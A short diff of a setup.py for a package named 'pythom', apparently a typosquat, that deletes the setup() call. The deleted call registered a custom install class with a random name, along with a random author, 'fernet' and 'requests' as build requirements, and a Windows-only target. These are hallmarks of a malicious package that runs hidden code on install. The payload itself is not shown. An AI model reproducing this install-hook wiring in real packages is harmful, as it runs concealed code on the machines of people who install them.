@@ -18,22 +18,5 @@ class iFPzRwutCgkysEaKtvwdPsjFelNxQHTKWOOAfsXYOwNtafKLLquuhxwYyHlpryQP(install):
             install.run(self)
 
 
-setup(
-    name="pythom",
-    version=VERSION,
-    author="uQLNMXpjsjWQSNt",
-    author_email="WyolYA@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': iFPzRwutCgkysEaKtvwdPsjFelNxQHTKWOOAfsXYOwNtafKLLquuhxwYyHlpryQP,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
